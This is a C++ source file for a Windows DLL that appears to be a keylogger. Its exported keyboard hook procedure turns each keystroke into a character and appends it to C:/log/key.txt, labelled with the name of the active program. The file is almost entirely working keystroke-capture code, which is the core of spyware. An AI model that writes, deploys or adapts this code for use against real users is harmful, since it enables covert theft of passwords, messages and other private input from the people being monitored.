#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#pragma   comment(lib,"shlwapi.lib")
__declspec(dllexport) HMODULE g_hMdl = NULL ;
__declspec(dllexport) HHOOK g_hHook = NULL;
#pragma comment(lib,"user32.lib")
#pragma data_seg("share")
char progname[256] = {0};
#pragma data_seg()
#pragma comment(linker, "/SECTION:flag_data,RWS")

FILE *fp = NULL;


BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // handle to the DLL module
                    DWORD fdwReason,     // reason for calling function
                    LPVOID lpvReserved)   // reserved
{
    switch(fdwReason){
        case DLL_PROCESS_ATTACH:
            g_hMdl = hinstDLL;
            break ;
        case DLL_PROCESS_DETACH:
            break;
    }
    return 1;
}

__declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lParam){
    char strBuf[MAX_PATH] = {0};
    char *p = NULL;
    // static char *old_p = NULL;
    if(code >= 0){
        if(!(lParam & 0x80000000)){
            GetModuleFileName(NULL, (LPTSTR)strBuf, sizeof(strBuf));
            p = strrchr(strBuf , '\\');
            if(!PathIsDirectory((LPTSTR)"C:/log"))
                CreateDirectory((LPTSTR)"C:/log", NULL);
            fp = fopen("C:/log/key.txt", "a+");
            if (fp == NULL) {
                MessageBox(NULL, (LPTSTR)"create file fail", (LPTSTR)"Error", MB_OK);
            }
            
            // if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
            //     if( wParam >= 'A' && wParam <= 'Z')
            //         wParam += 32;
            // }
            if(strcmp(p + 1, progname) != 0){
                fprintf(fp, "\n[%s]\n", p + 1);
            }
            // fputc(wParam,fp);
            char ch = 0;
            if (wParam==VK_RETURN){
                ch='\n';
            }
            else{
                BYTE ks[256];
                GetKeyboardState(ks);
                WORD w;
                UINT scan=0;
                ToAscii(wParam,scan,ks,&w,0);
                ch =char(w); 
            }
            fwrite(&ch, sizeof(char), 1, fp);//把按键字符 记录到文件


            fclose(fp);
            // old_p = p;
            strcpy(progname, p + 1);
            return CallNextHookEx(g_hHook, code, wParam, lParam);
        }
    }

    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

